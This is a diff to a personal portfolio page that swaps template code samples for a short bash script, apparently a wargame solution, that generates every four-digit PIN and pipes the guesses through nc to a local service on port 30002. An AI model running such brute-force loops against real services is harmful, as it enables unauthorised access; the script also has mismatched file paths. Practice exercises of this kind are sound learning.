@@ -75,19 +75,14 @@ At Protexxa CyberNations, I immersed myself in the world of cybersecurity. From 
 
 ### Scripting
 
-```js
-// Javascript code with syntax highlighting.
-var fun = function lang(l) {
-  dateformat.i18n = require('./lang/' + l)
-  return true;
-}
-```
+```/bin/bash
+// Bash script code for pincode bruteforcing.
+#!/bin/bash
+for i in {0000..9999}
+  do echo "password $i" >> /tmp/tmp/winraw/pincode.txt
+done
 
-```ruby
-# Ruby code with syntax highlighting
-GitHubPages::Dependencies.gems.each do |gem, version|
-  s.add_dependency(gem, "= #{version}")
-end
+cat pincode.txt | nc localhost 30002 >> passwordfornextlevel.txt
 ```
 
 #### Header 4
